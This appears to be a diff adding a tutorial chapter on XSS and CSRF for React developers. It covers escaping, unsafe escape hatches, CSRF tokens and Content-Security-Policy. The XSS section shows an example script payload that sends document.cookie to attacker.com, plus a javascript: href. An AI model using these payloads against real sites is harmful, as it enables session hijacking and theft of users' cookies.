@@ -1,0 +1,47 @@
+---
+title: "Security: XSS & CSRF from the Frontend"
+slug: "security-xss-csrf"
+description: "Where the actual exploitation happens, why React's defaults already block most of it, and what's still on you."
+published: true
+date: "2026-08-29"
+---
+
+## Why this stays scoped to the frontend
+
+Security is usually framed as a backend concern — validate input, sanitize database queries, authenticate requests. That's true, but incomplete: for the two vulnerabilities this chapter covers, **the browser is where the actual damage happens**, running attacker-controlled code inside a real, logged-in user's session. Understanding the frontend half isn't optional context — it's where a meaningful share of the actual defense has to live.
+
+## XSS: attacker script running as you, in your browser
+
+**Cross-Site Scripting** means an attacker gets their own JavaScript to execute in another user's browser, within that user's authenticated session — not "hacking the server," but hijacking a real user's browser to act on their behalf, with their cookies, their permissions, their session.
+
+A comment field that renders user input directly into the page without escaping it is the classic example: if a comment contains `<script>fetch('https://attacker.com?cookie=' + document.cookie)</script>`, and that gets rendered as _actual HTML_ rather than displayed as text, that script now runs in the browser of anyone who views the comment — with access to whatever that viewer's session can access.
+
+## Three flavors, one distinguishing detail
+
+- **Stored XSS** — the malicious payload is saved somewhere persistent (a database, a comment) and served to every subsequent viewer. The comment example above.
+- **Reflected XSS** — the payload comes from the current request itself (often a URL parameter) and gets echoed back into the page's HTML without a round-trip through storage — commonly via a crafted link a victim is tricked into clicking.
+- **DOM-based XSS** — the vulnerability lives entirely in client-side JavaScript that reads some attacker-influenced value (`location.hash`, `document.referrer`) and writes it into the DOM unsafely, with **no server involvement in the vulnerable step at all**. This is the one worth flagging specifically as a frontend developer's direct responsibility — it can exist even in a codebase with a perfectly secure backend, because the vulnerable code never touches the server.
+
+## Why React already blocks most of this — and how to defeat that protection anyway
+
+JSX escapes text content by default. `<p>{userComment}</p>` renders whatever `userComment` contains as literal text, even if it's full of `<script>` tags — React converts the special characters so they display as visible text rather than executing as markup. This is a genuinely strong default, and it's why XSS is less common in React codebases than in ones hand-assembling HTML strings.
+
+That protection has specific, known escape hatches — worth knowing exactly what defeats it, since each one is a deliberate opt-out, not an accident:
+
+- **`dangerouslySetInnerHTML`** — the name is intentionally alarming. It renders a raw HTML string as actual markup, bypassing escaping entirely. Only safe if the content is either fully trusted or has been through a real sanitization library (like DOMPurify) — not just "looks fine."
+- **Direct DOM manipulation** — reaching past React (`element.innerHTML = userInput` via a ref) sidesteps React's protections just as completely, since it's not going through JSX's rendering path at all.
+- **Unsanitized `href`/`src` values** — a user-controlled `href="javascript:alert(document.cookie)"` on a link is a real, often-overlooked vector, since it's not "HTML injection" in the usual sense — it's an executable URL scheme slipping through a spot that looks like ordinary data.
+
+## CSRF, from the frontend's actual role
+
+CSRF exploits the automatic cookie-sending behavior covered in the previous chapter — but as a frontend developer, the primary defense (CSRF tokens, `SameSite` cookie attributes) is largely enforced server-side, not something frontend code implements from scratch. What frontend code _does_ need to do is **cooperate correctly**: when a server issues a CSRF token (often embedded in a form or a response header), your frontend code needs to actually read it and include it on subsequent state-changing requests — a frontend that silently drops or ignores the token undermines a defense the backend already built.
+
+## Content-Security-Policy: a backstop, even if XSS gets in
+
+**CSP** is a response header that tells the browser an explicit allowlist of what the page is permitted to execute or load — which script sources are trusted, whether inline `<script>` tags are allowed at all, which domains images/fonts can load from. It's enforced by the browser itself, independent of your application code.
+
+The reason it matters even with careful escaping elsewhere: it's a genuine last line of defense. If an XSS payload somehow gets injected despite everything above, a well-configured CSP can still block that injected script from actually running or from exfiltrating data to an attacker's domain — because the browser refuses to execute script from a source not on the allowlist, regardless of how it ended up in the page.
+
+## The recurring theme: trust boundaries
+
+Every vulnerability in this chapter comes back to the same root idea: **content you didn't fully control the origin of should never be treated as safe to execute or render as markup** — including your own database. Data that's sitting in your own database isn't automatically trustworthy just because it's _your_ database; if it got there via an earlier unescaped user submission, it's already a stored XSS payload waiting for the next unsuspecting render. Security isn't a one-time check at the point data enters your system — it's a property that has to hold at every point that data gets displayed, no matter how many steps removed from where it originated.
